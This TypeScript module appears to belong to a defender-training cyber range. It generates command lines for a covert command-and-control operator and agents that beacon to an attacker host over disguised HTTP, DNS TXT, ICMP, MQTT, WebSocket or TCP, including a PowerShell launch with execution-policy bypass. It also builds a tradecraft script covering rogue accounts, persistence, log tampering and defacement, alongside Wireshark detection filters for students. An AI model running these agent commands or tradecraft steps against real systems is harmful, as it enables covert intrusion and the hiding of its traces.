export type ChannelId = "tcp" | "http" | "dns" | "mqtt" | "ws" | "icmp";
export type Timing = "continuous" | "off";

export type BenchConfig = {
  attacker: string;
  token: string;
  linuxId: string;
  windowsId: string;
  channel: ChannelId;
  timing: Timing;
  zone: string;
  tcp: number;
  http: number;
  dns: number;
  mqtt: number;
  ws: number;
  webroot: string;
  jump1User: string;
  jump1Host: string;
  jump2User: string;
  jump2Host: string;
  wanUser: string;
  student: string;
  actor: string;
  shell: ShellChoice;
  wall: string;
  hosts: LabHost[];
};

export const PRESET_PRIVILEGED = { tcp: 443, http: 80, dns: 53, mqtt: 1883, ws: 8070 };
export const PRESET_OPEN = { tcp: 8443, http: 8088, dns: 5353, mqtt: 1883, ws: 8070 };

export const CHANNELS: {
  id: ChannelId;
  label: string;
  powershell: boolean;
  filter: string;
  tell: string;
  shape: string;
}[] = [
  {
    id: "tcp",
    label: "TCP",
    powershell: true,
    filter: "tcp.port == 443 && !tls",
    tell: "Port 443 with no TLS Client Hello. One base64 line each way. Follow the stream, then decode.",
    shape: "d3s1...  (base64 of a short JSON frame, not a shell prompt)",
  },
  {
    id: "http",
    label: "HTTP",
    powershell: true,
    filter: 'http.request.uri contains "/debian/dists" or http.request.uri contains "/ocsp/"',
    tell: "Linux traffic looks like apt fetching InRelease. A real MD5 is 32 hex characters; a task is much longer. Windows looks like an OCSP status whose Nonce grew. Cookie sid= is the agent name.",
    shape: "MD5Sum:\n <long hex> 812 main/binary-amd64/Packages",
  },
  {
    id: "dns",
    label: "DNS",
    powershell: false,
    filter: 'dns.qry.name contains ".lab" && dns.qry.type == 16',
    tell: "TXT queries straight at the attacker, not the lab resolver. Idle answers are 32 hex characters. A task is a longer hex TXT. Labels on the way back carry hex too.",
    shape: "p.web01.41.lab    TXT    <hex>",
  },
  {
    id: "mqtt",
    label: "MQTT",
    powershell: false,
    filter: "mqtt",
    tell: "A broker on the attacker. Topics lab/<id>/in and lab/<id>/out. The payload is base64, the topic is the only obvious structure.",
    shape: "PUBLISH lab/web01/in\n<base64>",
  },
  {
    id: "ws",
    label: "WebSocket",
    powershell: true,
    filter: "websocket",
    tell: "One HTTP upgrade to /notifications, then quiet text frames. Students who only look at HTTP objects see a single request.",
    shape: "GET /notifications HTTP/1.1\nUpgrade: websocket",
  },
  {
    id: "icmp",
    label: "ICMP",
    powershell: false,
    filter: "icmp && data.len > 32",
    tell: "Echo requests whose data field is base64, on a timer, with a stable ICMP id. Linux only, and the attacker stops answering ordinary pings while the operator is running.",
    shape: "type 8  id=0x1a2b  data=<base64>",
  },
];

export function sanitizeId(value: string) {
  const clean = value.toLowerCase().replace(/[^a-z0-9-]/g, "").replace(/^-+|-+$/g, "");
  return (clean || "host").slice(0, 24);
}

export function sanitizeZone(value: string) {
  return sanitizeId(value || "lab");
}

function shQuote(value: string) {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function psQuote(value: string) {
  return `'${value.replace(/'/g, "''")}'`;
}

function tokenOrPlaceholder(token: string) {
  const value = token.trim().length >= 8 ? token.trim() : "your-lab-token";
  return value;
}

function portFlags(cfg: BenchConfig) {
  return [
    `--tcp-port ${cfg.tcp}`,
    `--http-port ${cfg.http}`,
    `--dns-port ${cfg.dns}`,
    `--mqtt-port ${cfg.mqtt}`,
    `--ws-port ${cfg.ws}`,
    `--zone ${sanitizeZone(cfg.zone)}`,
  ].join(" ");
}

export function operatorCommand(cfg: BenchConfig, files?: { page?: string; image?: string }) {
  const token = shQuote(tokenOrPlaceholder(cfg.token));
  const webroot = cfg.webroot.trim() ? ` --webroot ${shQuote(cfg.webroot.trim())}` : "";
  const attacker = cfg.attacker.trim() ? ` --attacker ${shQuote(cfg.attacker.trim())}` : "";
  const page = files?.page ? ` --page ${shQuote(files.page)}` : "";
  const image = files?.image ? ` --image ${shQuote(files.image)}` : "";
  return `sudo python3 range.py operator --token ${token} --bind 0.0.0.0 ${portFlags(cfg)}${webroot}${attacker}${page}${image}`;
}

export function linuxAgentCommand(cfg: BenchConfig) {
  const token = shQuote(tokenOrPlaceholder(cfg.token));
  return [
    "sudo python3 range.py agent",
    `--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
    `--channel ${cfg.channel}`,
    `--token ${token}`,
    `--id ${sanitizeId(cfg.linuxId)}`,
    `--profile ${cfg.timing}`,
    portFlags(cfg),
  ].join(" ");
}

export function windowsCommand(cfg: BenchConfig) {
  const token = psQuote(tokenOrPlaceholder(cfg.token));
  const channel = CHANNELS.find((item) => item.id === cfg.channel);
  if (!channel?.powershell) {
    const quoted = shQuote(tokenOrPlaceholder(cfg.token));
    return [
      "python range.py agent",
      `--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
      `--channel ${cfg.channel}`,
      `--token ${quoted}`,
      `--id ${sanitizeId(cfg.windowsId)}`,
      `--profile ${cfg.timing}`,
      portFlags(cfg),
    ].join(" ");
  }
  return [
    "powershell -NoProfile -ExecutionPolicy Bypass -File .\\range-agent.ps1",
    `-C2 ${cfg.attacker.trim() || "10.0.0.10"}`,
    `-Channel ${cfg.channel}`,
    `-Token ${token}`,
    `-Id ${sanitizeId(cfg.windowsId)}`,
    `-Timing ${cfg.timing}`,
    `-TcpPort ${cfg.tcp}`,
    `-HttpPort ${cfg.http}`,
    `-WsPort ${cfg.ws}`,
  ].join(" ");
}

export function needsPythonOnWindows(channel: ChannelId) {
  return !CHANNELS.find((item) => item.id === channel)?.powershell;
}

export type LabHost = {
  id: string;
  name: string;
  role: "router" | "host";
  os: string;
  address: string;
  port: number;
  sshUser: string;
  focus: boolean;
  note: string;
};

export const DEFAULT_HOSTS: LabHost[] = [
  { id: "wan", name: "wan", role: "router", os: "VYOS", address: "10.50.160.129", port: 20222, sshUser: "atropia_admin", focus: false, note: "Last two octets change. Router port stays 20222. This hop is the path, not a fanout target." },
  { id: "lan", name: "lan", role: "router", os: "VYOS", address: "172.24.18.1", port: 20222, sshUser: "atropia_admin", focus: true, note: "" },
  { id: "lan2", name: "lan2", role: "router", os: "VYOS", address: "172.24.2.4", port: 20222, sshUser: "atropia_admin", focus: true, note: "" },
  { id: "win-82", name: "win-82", role: "host", os: "Windows 10", address: "172.24.18.82", port: 22, sshUser: "defender", focus: true, note: "" },
  { id: "deb-68", name: "deb-68", role: "host", os: "Debian 12", address: "172.24.18.68", port: 22, sshUser: "root", focus: true, note: "" },
  { id: "deb-150", name: "deb-150", role: "host", os: "Debian 12", address: "172.24.10.150", port: 22, sshUser: "root", focus: true, note: "" },
  { id: "web-nginx", name: "web-nginx", role: "host", os: "Debian 12", address: "172.24.10.180", port: 22, sshUser: "root", focus: true, note: "NGINX defacement" },
  { id: "deb9-44", name: "deb9-44", role: "host", os: "Debian 9", address: "172.24.19.44", port: 22, sshUser: "root", focus: true, note: "Debian 9" },
  { id: "deb-22", name: "deb-22", role: "host", os: "Debian 12", address: "172.24.22.19", port: 22, sshUser: "root", focus: true, note: "" },
];

export type ShellChoice = "vi" | "python" | "perl";

export const DEFAULT_CONFIG: BenchConfig = {
  attacker: "10.0.0.10",
  token: "",
  linuxId: "web-nginx",
  windowsId: "win-82",
  channel: "ws",
  timing: "continuous",
  zone: "lab",
  webroot: "",
  jump1User: "cvte",
  jump1Host: "10.50.11.232",
  jump2User: "cvte",
  jump2Host: "172.24.24.101",
  wanUser: "atropia_admin",
  student: "defender",
  actor: "mail",
  shell: "vi",
  wall: "The page changed. The process list is the wrong tool.",
  hosts: DEFAULT_HOSTS,
  ...PRESET_PRIVILEGED,
};

function sanitizeHostName(value: string) {
  const clean = value.toLowerCase().replace(/[^a-z0-9-]/g, "").replace(/^-+|-+$/g, "");
  return (clean || "host").slice(0, 24);
}

export function hostsDocument(cfg: BenchConfig) {
  const wan = cfg.hosts.find((host) => host.id === "wan");
  return {
    jumps: [
      { name: "jump-a", user: cfg.jump1User.trim() || "cvte", host: cfg.jump1Host.trim(), port: 22 },
      { name: "jump-b", user: cfg.jump2User.trim() || "cvte", host: cfg.jump2Host.trim(), port: 22 },
    ],
    hosts: cfg.hosts.map((host) => ({
      id: host.id,
      name: host.name,
      role: host.role,
      os: host.os,
      host: host.address.trim(),
      port: host.port,
      user: host.id === "wan" ? cfg.wanUser.trim() || host.sshUser : host.sshUser,
      focus: host.focus,
      note: host.note,
    })),
    wanUser: cfg.wanUser.trim() || wan?.sshUser || "atropia_admin",
  };
}

export function sshConfig(cfg: BenchConfig) {
  const doc = hostsDocument(cfg);
  const lines = [
    "# Range lab path. Use with ssh -F. This file replaces proxychains.",
    "# The first connection types the jump passwords and then keeps a master socket.",
    "# ICMP does not fit in a SOCKS proxy. Ping from lab-wan, which is already on the lab.",
    "Host *",
    "  ControlMaster auto",
    "  ControlPath ~/.ssh/range-cm-%C",
    "  ControlPersist yes",
    "  ServerAliveInterval 30",
    "  ServerAliveCountMax 0",
    "  StrictHostKeyChecking accept-new",
    "",
  ];
  let previous = "";
  doc.jumps.forEach((jump) => {
    lines.push(`Host ${jump.name}`);
    lines.push(`  HostName ${jump.host}`);
    lines.push(`  User ${jump.user}`);
    lines.push(`  Port ${jump.port}`);
    if (previous) lines.push(`  ProxyJump ${previous}`);
    lines.push("");
    previous = jump.name;
  });
  const wan = doc.hosts.find((host) => host.name === "wan" || host.id === "wan");
  const others = doc.hosts.filter((host) => host !== wan);
  if (wan) {
    lines.push("Host lab-wan");
    lines.push(`  HostName ${wan.host}`);
    lines.push(`  User ${wan.user || "atropia_admin"}`);
    lines.push(`  Port ${wan.port || 20222}`);
    if (previous) lines.push(`  ProxyJump ${previous}`);
    lines.push("");
  }
  others.forEach((host) => {
    const alias = `lab-${sanitizeHostName(host.name || host.host)}`;
    lines.push(`Host ${alias}`);
    lines.push(`  HostName ${host.host}`);
    lines.push(`  User ${host.user || "root"}`);
    lines.push(`  Port ${host.port || 22}`);
    lines.push(wan ? "  ProxyJump lab-wan" : previous ? `  ProxyJump ${previous}` : "");
    lines.push("");
  });
  return lines.filter((line) => line !== undefined).join("\n").replace(/\n{3,}/g, "\n\n").trim() + "\n";
}

export function keysCommand() {
  return "python3 range.py keys --hosts range-hosts.json --ssh-config range-ssh.conf";
}

export function openTunnelCommand() {
  return "ssh -F range-ssh.conf lab-wan";
}

export function pingCommand(address: string) {
  return `python3 range.py ping --ssh-config range-ssh.conf ${address.trim() || "172.24.10.180"}`;
}

export function fanoutCommand() {
  return "python3 range.py fanout --hosts range-hosts.json --ssh-config range-ssh.conf --cmd 'hostname; who'";
}

export function watchCommand(student: string) {
  const who = sanitizeId(student || "defender");
  return `python3 range.py watch --hosts range-hosts.json --ssh-config range-ssh.conf --student ${who}`;
}

export function tradecraftScript(cfg: BenchConfig) {
  const student = sanitizeId(cfg.student || "defender");
  const actor = sanitizeId(cfg.actor || "mail");
  const shell = cfg.shell || "vi";
  const wall = (cfg.wall || "The page changed.").replace(/\n/g, " ");
  const id = sanitizeId(cfg.linuxId || "web-nginx");
  return [
    `use ${id}`,
    `play history ${student}`,
    `play account ${actor}`,
    `play shell ${student} ${shell}`,
    `play wall ${wall}`,
    "play cloak",
    `play veil ${actor}`,
    "play persist",
    "play stamp",
    `play boot ${student}`,
    "play logs",
    "tty",
    "get /etc/hostname ./hostname.txt",
    "put ./hostname.txt /tmp/hostname.txt",
    "play deface",
  ].join("\n");
}

function crc32(data: Uint8Array) {
  let crc = 0xffffffff;
  for (let i = 0; i < data.length; i += 1) {
    crc ^= data[i];
    for (let bit = 0; bit < 8; bit += 1) {
      crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

export function normalizeConfig(saved: Partial<BenchConfig> | null | undefined): BenchConfig {
  const shell = saved?.shell === "python" || saved?.shell === "perl" || saved?.shell === "vi" ? saved.shell : "vi";
  const hosts = (Array.isArray(saved?.hosts) && saved.hosts.length > 0 ? saved.hosts : DEFAULT_HOSTS).map((host) => {
    if (host.id === "deb9-150" || (host.address === "172.24.10.150" && /debian 9/i.test(host.os))) {
      return { ...host, id: "deb9-44", name: host.name === "deb9-150" ? "deb9-44" : host.name, address: "172.24.19.44", os: "Debian 9", note: host.note.includes("Same address") ? "Debian 9" : host.note };
    }
    return host;
  });
  const timing = saved?.timing === "off" ? "off" : "continuous";
  return { ...DEFAULT_CONFIG, ...saved, shell, hosts, timing };
}

export function zipStore(files: { name: string; data: Uint8Array }[]) {
  const chunks: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let offset = 0;
  const encoder = new TextEncoder();
  files.forEach((file) => {
    const name = encoder.encode(file.name);
    const crc = crc32(file.data);
    const local = new Uint8Array(30 + name.length);
    const view = new DataView(local.buffer);
    view.setUint32(0, 0x04034b50, true);
    view.setUint16(4, 20, true);
    view.setUint16(8, 0, true);
    view.setUint16(26, name.length, true);
    view.setUint32(14, crc, true);
    view.setUint32(18, file.data.length, true);
    view.setUint32(22, file.data.length, true);
    local.set(name, 30);
    chunks.push(local, file.data);
    const cent = new Uint8Array(46 + name.length);
    const cv = new DataView(cent.buffer);
    cv.setUint32(0, 0x02014b50, true);
    cv.setUint16(4, 20, true);
    cv.setUint16(6, 20, true);
    cv.setUint16(28, name.length, true);
    cv.setUint32(16, crc, true);
    cv.setUint32(20, file.data.length, true);
    cv.setUint32(24, file.data.length, true);
    cv.setUint32(42, offset, true);
    cent.set(name, 46);
    central.push(cent);
    offset += local.length + file.data.length;
  });
  const centralSize = central.reduce((sum, part) => sum + part.length, 0);
  const end = new Uint8Array(22);
  const ev = new DataView(end.buffer);
  ev.setUint32(0, 0x06054b50, true);
  ev.setUint16(8, files.length, true);
  ev.setUint16(10, files.length, true);
  ev.setUint32(12, centralSize, true);
  ev.setUint32(16, offset, true);
  const blob = new Blob([...(chunks as BlobPart[]), ...(central as BlobPart[]), end], { type: "application/zip" });
  return blob;
}

